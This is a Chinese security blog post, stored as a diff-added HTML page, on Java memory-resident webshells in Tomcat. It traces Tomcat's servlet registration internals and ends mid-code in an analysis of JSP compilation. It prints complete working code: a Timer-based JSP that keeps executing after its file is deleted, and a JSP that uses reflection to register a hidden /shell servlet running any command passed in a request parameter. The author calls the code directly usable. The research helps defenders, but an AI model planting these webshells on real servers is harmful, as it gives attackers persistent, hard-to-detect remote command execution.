@@ -1,0 +1,518 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>JavaWeb Timer And Servlet shell diffenence | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2022-04-12T00:09:33.000Z" itemprop="datePublished">
+          2022-04-12
+      </time>
+    
+</span>
+                <h1>JavaWeb Timer And Servlet shell diffenence</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>也是一个好久前的学习的课题了，今天来记述一波；<code>后面有自己调试的timer内存马；可直接利用</code>；</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>内存马对于java来说还是比较的花式的，在php中可以直接通过while进行无限的循环从而拿到外部参数进行命令执行；那么类比一下；</p>
+<h3 id="新思路："><a href="#新思路：" class="headerlink" title="新思路："></a>新思路：</h3><p>​    采用java计时任务进行内存马利用；简单的原理就是采用一个java.util.Timer实例化一个Timer对象；利用schedule函数开启一个TimerTask；也就是说创建了一个定时任务，每隔 1000 ms，就执行一次 <code>java.util.TimerTask#run</code> 方法里面的逻辑。也就是说在访问了jsp之后会开启一个计划任务，然后每1000ms就会执行一次我们的run方法里的代码；即使后续删除了这个jsp，但是因为计划任务已经是执行在内存中，所以也不会有影响，有点类似php中的直接while；来实际测试下；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">  out.println(<span class="string">&quot;timer jsp shell&quot;</span>);</span><br><span class="line">  java.util.Timer executeSchedule = <span class="keyword">new</span> java.util.Timer();</span><br><span class="line">  executeSchedule.schedule(<span class="keyword">new</span> java.util.TimerTask() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, <span class="number">0</span>, <span class="number">10000</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>​    <a target="_blank" rel="noopener" href="https://imgtu.com/i/LQRO9U"><img src="https://s1.ax1x.com/2022/04/14/LQRO9U.png" alt="LQRO9U.png"></a></p>
+<p>每隔十秒就会弹一次计算器；</p>
+<p>我们删除掉相关的jsp文件，看看情况；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/LQWf56"><img src="https://s1.ax1x.com/2022/04/14/LQWf56.png" alt="LQWf56.png"></a></p>
+<p>可以看到已经删除了文件，但是Timer线程依然在进行，也会一直弹出计算器；</p>
+<p>其实也都知道，jsp的本质就是servlet；那么就会存在一个新的问题，这种的木马算是servlet的那种内存马么；如果这么可以形成内存马的效果，那么可以进行外部参数可控么？    带着问题下面分析一下：jsp和servlet</p>
+<h2 id="分析Servlet生成"><a href="#分析Servlet生成" class="headerlink" title="分析Servlet生成"></a>分析Servlet生成</h2><p>servlet的生命周期一共经历三个阶段：我的理解是：</p>
+<p>1、在请求到来的时候通过init进行初始化阶段（只会调用一次）</p>
+<p>2、在之后调用service函数，传入ServletRequest对象经过servlet函数处理，按照请求方式去触发doGet()，doPost()方法，这些方法包括service方法都是运行的在多线程状态下；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3RV5q"><img src="https://s1.ax1x.com/2022/04/15/L3RV5q.png" alt="L3RV5q.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3RNRK"><img src="https://s1.ax1x.com/2022/04/15/L3RNRK.png" alt="L3RNRK.png"></a></p>
+<p>3、在tomcat正常关闭的时候进行调用destroy函数正常销毁；</p>
+<p>​    一个正常的url进行解析的时候根据tomcat里mapper组件的映射关系，最后锁定到一个servlet；就会经过filter之后传入service函数中触发上述的第二步，实例化servlet之后对请求进行逻辑处理；</p>
+<p>​    因为只是关注servlet的内存马问题，所以不必追溯太前，直接从针对于servlet注册的地方开始看；放眼全局，有一个tomcat的类很重要：ContextConfig；这个class负责tomcat中整个WEB应用的配置文件的解析工作；留意其中的一个敏感的方法；webConfig方法；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1c4ns"><img src="https://s1.ax1x.com/2022/04/14/L1c4ns.png" alt="L1c4ns.png"></a></p>
+<p>可以看到这个方法里会对应用下的配置文件作相应的解析；这个配置文件里设置的就是servlet以及filter之类的信息对应的路由；</p>
+<p>在configureContext函数中对其xml文件进行读取；拿到其中的相关映射；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1I6Nd"><img src="https://s1.ax1x.com/2022/04/14/L1I6Nd.png" alt="L1I6Nd.png"></a></p>
+<p>追进去看一下细致的逻辑，这个函数中已经知道是对filter以及servlet等一些配置做一些处理，并且进行映射；着重的看一下对servlet的处理；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1ovRI"><img src="https://s1.ax1x.com/2022/04/14/L1ovRI.png" alt="L1ovRI.png"></a></p>
+<p>看到这里是将相关的配置项进行映射放到了hashmap中；然后后续对其进行遍历处理；</p>
+<p>遍历之后为每一个servlet进行createwrapper，然后遍历配置中的数据set到wrapper中；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1TtQx"><img src="https://s1.ax1x.com/2022/04/14/L1TtQx.png" alt="L1TtQx.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1Tf0S"><img src="https://s1.ax1x.com/2022/04/14/L1Tf0S.png" alt="L1Tf0S.png"></a></p>
+<p>然后将servletname也设置到wrapper中；具体看下图：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L17etH"><img src="https://s1.ax1x.com/2022/04/14/L17etH.png" alt="L17etH.png"></a></p>
+<p>继续向下走，因为multipartdef为null；所以直接跳过一堆的代码逻辑，直接来到最后；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L178HS"><img src="https://s1.ax1x.com/2022/04/14/L178HS.png" alt="L178HS.png"></a></p>
+<p>最后将wrapper给add到StandardWrapper对象中；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1HebT"><img src="https://s1.ax1x.com/2022/04/14/L1HebT.png" alt="L1HebT.png"></a></p>
+<p>addChild之后在addServletMappingDecoded函数中完成了相关的映射；将url路径和servlet类进行相关映射</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1LiPe"><img src="https://s1.ax1x.com/2022/04/14/L1LiPe.png" alt="L1LiPe.png"></a></p>
+<p>这个看起来更清晰明了</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L1L12j"><img src="https://s1.ax1x.com/2022/04/14/L1L12j.png" alt="L1L12j.png"></a></p>
+<p>add完之后进入如下流程：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3FYpq"><img src="https://s1.ax1x.com/2022/04/14/L3FYpq.png" alt="L3FYpq.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3kfx0"><img src="https://s1.ax1x.com/2022/04/14/L3kfx0.png" alt="L3kfx0.png"></a></p>
+<p>startInternal函数实现载入调用；我们跟一下流程看看；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3AGQ0"><img src="https://s1.ax1x.com/2022/04/14/L3AGQ0.png" alt="L3AGQ0.png"></a></p>
+<p>经历一个for循环，检查其状态是否为start；否则调用start();</p>
+<p>这里一直往下跟，最终进入如下流程：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3VK8s"><img src="https://s1.ax1x.com/2022/04/14/L3VK8s.png" alt="L3VK8s.png"></a></p>
+<p>追进去看一下：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3VBKx"><img src="https://s1.ax1x.com/2022/04/14/L3VBKx.png" alt="L3VBKx.png"></a></p>
+<p>可以看到拿到了四个封装好了的servlet wrapper；然后进入for循环，判断其loadOnStartup是否大于0，如果大于0，则将其add到list中；</p>
+<p>然而StandardWrapper中默认为-1</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> loadOnStartup = -<span class="number">1</span>;</span><br></pre></td></tr></table></figure>
+
+<p>然后while遍历list进行load加载：具体看下；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3VXzn"><img src="https://s1.ax1x.com/2022/04/14/L3VXzn.png" alt="L3VXzn.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3mkK1"><img src="https://s1.ax1x.com/2022/04/15/L3mkK1.png" alt="L3mkK1.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3mEb6"><img src="https://s1.ax1x.com/2022/04/15/L3mEb6.png" alt="L3mEb6.png"></a></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">volatile</span> <span class="keyword">boolean</span> singleThreadModel = <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>
+
+<p>恰好singleThreadModel默认就为false；这里就需要控制instance不为null就行了，然后向上回溯到initServlet中完成初始化；回顾下instance的赋值点：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3mUPg"><img src="https://s1.ax1x.com/2022/04/15/L3mUPg.png" alt="L3mUPg.png"></a></p>
+<p>所以这里还需要调用Wrapper class下的setServlet函数进行赋值servlet；</p>
+<p>在servlet的配置当中，<code>&lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</code>的含义是：</p>
+<p>标记容器是否在启动的时候就加载这个servlet。</p>
+<p>当值为0或者大于0时，表示容器在应用启动时就加载这个servlet；</p>
+<p>当是一个负数时或者没有指定时，则指示容器在该servlet被选择时才加载。</p>
+<p>正数的值越小，启动该servlet的优先级越高。</p>
+<p>由于我们要注入内存马，且没有配置xml不会在应用启动时就加载这个servlet，因此需要把优先级调至1，让自己写的servlet直接被加载</p>
+<p>看完这个流程我们简单的整理一下逻辑，</p>
+<p>1、StandardContext.createWrapper    </p>
+<p>2、setLoadOnStartup和setEnabled（视配置项是否为null来进行，如果为null则不进行，一般为null，差不多可忽略,但是setLoadOnStartup函数的调用不可忽略）</p>
+<p>3、setName(servlet.getServletName())；//这里注意实际写的时候需要结合实际，servlet在此是servletDef对象；</p>
+<p>4、setServletClass</p>
+<p>5、setServlet</p>
+<p>6、setAsyncSupported（视配置项是否为null来进行，一般为null，可忽略）</p>
+<p>7、context.addChild(wrapper);    （context为StandardContext）</p>
+<p>8、addServletMappingDecoded进行url路由和servlet class的映射</p>
+<p>按照这八步来，就可以通过反射去动态的注册一个Servlet；可以看到上述的context都为StandardContext；如果可以拿到StandardContext，那么就可进行Servlet的动态注册；jsp的本质也是servlet；所以直接从request里着手；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br></pre></td></tr></table></figure>
+
+<p>拿到servletContext之后可以看一下其继承关系；servletContext是一个接口；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3gYwR"><img src="https://s1.ax1x.com/2022/04/15/L3gYwR.png" alt="L3gYwR.png"></a></p>
+<p>这里可以利用多态直接强转化为applicationContext；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3gBlD"><img src="https://s1.ax1x.com/2022/04/15/L3gBlD.png" alt="L3gBlD.png"></a></p>
+<p>可以很清晰的看到，在ApplicationContext中直接可以通过反射拿到context属性就可直接拿到StandardContext对象；所以这也是为什么上面那段代码的缘由；</p>
+<p>上面的分析只是注册servlet的过程，那么当实际调用的时候在请求经过mapper映射到servlet的时候，会调用service方法将ServletRequest和ServletResponse对象进行传入；实例化servlet进行处理请求；所以理解了这里思路就很简单了，service方法在每次请求的时候都会触发；所以思路有两种，</p>
+<p>第一：将恶意的代码插入到doGet方法里，当请求到达的时候会触发doGet方法进行相关的触发；就可造成命令执行操作；</p>
+<p>第二：直接重写service方法；在其中插入恶意的代码；其处理的对象为ServletRequest，里面封装了请求数据。HttpServlet是对请求数据进一步的封装而已；</p>
+<p>所以知道了基本的思路和原理，直接写；</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">ServletContext servletContext = request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line">    Field appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"></span><br><span class="line">    Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    HttpServlet httpservlet = <span class="keyword">new</span> HttpServlet()&#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">            String str = request.getParameter(<span class="string">&quot;s1mple&quot;</span>);</span><br><span class="line">            Process runtime = Runtime.getRuntime().exec(str);</span><br><span class="line">            InputStream inputStream = runtime.getInputStream();</span><br><span class="line">            <span class="keyword">byte</span>[] by = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">int</span> content;</span><br><span class="line">            ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">            <span class="keyword">while</span>((content = inputStream.read(by))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                byteArrayOutputStream.write(by);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">byte</span>[] by_data = byteArrayOutputStream.toByteArray();</span><br><span class="line">            String data = <span class="keyword">new</span> String(by_data,by_data.length);</span><br><span class="line">            response.setContentType(<span class="string">&quot;text/html&quot;</span>);</span><br><span class="line">            PrintWriter printWriter = response.getWriter();</span><br><span class="line">            printWriter.println(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    Wrapper wrapper = standardContext.createWrapper();</span><br><span class="line">    wrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    wrapper.setName(httpservlet.getClass().getSimpleName());</span><br><span class="line">    wrapper.setServletClass(httpservlet.getClass().getName());</span><br><span class="line">    wrapper.setServlet(httpservlet);</span><br><span class="line">    standardContext.addChild(wrapper);</span><br><span class="line">    standardContext.addServletMappingDecoded(<span class="string">&quot;/shell&quot;</span>,httpservlet.getClass().getSimpleName());</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>如此，一个servlet的内存马就已经写完，测试一下效果；</p>
+<p>最开始访问下shell路由；显然无效果：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3o8XV"><img src="https://s1.ax1x.com/2022/04/15/L3o8XV.png" alt="L3o8XV.png"></a></p>
+<p>请求shell文件，然后再次访问；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3o7B8"><img src="https://s1.ax1x.com/2022/04/15/L3o7B8.png" alt="L3o7B8.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L3TFN4"><img src="https://s1.ax1x.com/2022/04/15/L3TFN4.png" alt="L3TFN4.png"></a></p>
+<p>发现已经注入；</p>
+<p>之前说jsp其实本质上也是servlet；其实如果跟着上述的流程进行追踪，就会不难发现jsp和jspx后缀都会被映射到一个关键字“jsp”上；然而tomcat中默认配置解析jsp的类就是JspServlet；</p>
+<p>接下来看下 JspServlet 的处理逻辑，总体来说分为三步:</p>
+<p>1、JSP 引擎将 <code>.jsp</code> 文件翻译成一个 servlet 源代码;</p>
+<p>2、将 servlet 源代码编译成 <code>.class</code> 文件;</p>
+<p> 3、加载并执行这个编译后的文件。</p>
+<p>而这一整套流程，实际上就是 Tomcat 为 JSP 的处理单独建立了一套与普通 Servlet 类似的 Servlet/Context/Wrapper 的体系:<br>- <code>org.apache.jasper.compiler.JspRuntimeContext</code>：JSP 引擎上下文<br>- <code>org.apache.jasper.servlet.JspServletWrapper</code>：编译后 jsp 的封装类</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8wEB6"><img src="https://s1.ax1x.com/2022/04/15/L8wEB6.png" alt="L8wEB6.png"></a></p>
+<p>可以看到JspRuntimeContext中存放了url路由和wraper的映射；</p>
+<p>上面已经跟过了源码，大致的流程都差不多，这里跟一下：</p>
+<p>JspServlet 类的 service 方法用来处理 JSP 请求：</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8wcUU"><img src="https://s1.ax1x.com/2022/04/15/L8wcUU.png" alt="L8wcUU.png"></a></p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8wjxA"><img src="https://s1.ax1x.com/2022/04/15/L8wjxA.png" alt="L8wjxA.png"></a></p>
+<p>看到这里先拿到jsp的访问路径jspUri，然后判断是否已经预编译，然后传入serviceJspFile函数进行后续的处理；跟进一下这个函数；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L80liF"><img src="https://s1.ax1x.com/2022/04/15/L80liF.png" alt="L80liF.png"></a></p>
+<p>看到先从映射中get到相关的wrapper，如果没有就会去判断这个文件路径是否存在（文件是否还在不在），如果存在就创建一个wrapper然后add到rctxt也就是JspRuntimeContext中；如果不存在就会调用handleMissingResource函数进行html编码之后返回错误，然后调用 wrapper 的 <code>service</code> 方法处理，同时也 catch 了 FileNotFoundException 异常。</p>
+<p>创建 JspServletWrapper 时，同时创建了 JspCompilationContext 类用于将 jsp 编译成 class 文件，用于后续加载。JspServletWrapper 的 <code>service</code> 方法在判断了一些标识位后，判断是否是首次访问，是否需要对 jsp 进行编译，如需要则会调用 <code>JspCompilationContext#compile</code> 方法来对 jsp 进行编译；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/L8sIA0"><img src="https://s1.ax1x.com/2022/04/15/L8sIA0.png" alt="L8sIA0.png"></a></p>
+<p>进入编译方法看一下逻辑：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">compile</span><span class="params">()</span> <span class="keyword">throws</span> JasperException, FileNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.createCompiler();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.jspCompiler.isOutDated()) &#123;<span class="comment">//判断是否过期，如果过期则重新加载；</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.isRemoved()) &#123;<span class="comment">//判断文件是否已经删除，如果已经删除则报错</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="keyword">this</span>.jspUri);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">this</span>.jspCompiler.removeGeneratedFiles();<span class="comment">//删除掉原本的文件(.java/.class)</span></span><br><span class="line">            <span class="keyword">this</span>.jspLoader = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">this</span>.jspCompiler.compile();<span 